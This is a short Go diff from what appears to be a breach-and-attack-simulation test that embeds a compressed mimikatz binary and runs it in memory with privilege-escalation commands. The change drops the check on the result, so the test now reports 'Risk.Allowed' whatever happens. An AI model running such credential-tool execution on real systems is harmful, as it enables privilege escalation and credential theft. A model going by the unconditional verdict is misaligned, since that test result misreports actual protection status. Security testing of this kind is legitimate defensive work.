@@ -8,7 +8,6 @@ import (
 	"github.com/praetorian-inc/chariot-bas/endpoint"
 	"github.com/praetorian-inc/goffloader/src/pe"
 	"log"
-	"strings"
 )
 
 //go:embed static/binaries/mimikatz.x64.exe.gz.prt
@@ -42,16 +41,10 @@ func mimi_test() {
 	}
 
 	fmt.Sprintf("%s", string(shakespeare))
-	output, err := pe.RunExecutable(decompressedBytes, []string{
+	pe.RunExecutable(decompressedBytes, []string{
 		"privilege::debug", "token::elevate", "exit"})
 
-	fmt.Println(output)
-
-	if strings.Contains(output, "NT AUTHORITY\\SYSTEM") {
-		endpoint.Stop(endpoint.Risk.Allowed)
-	} else {
-		endpoint.Stop(endpoint.Protected.Blocked)
-	}
+	endpoint.Stop(endpoint.Risk.Allowed)
 }
 
 func mimi_cleanup() {
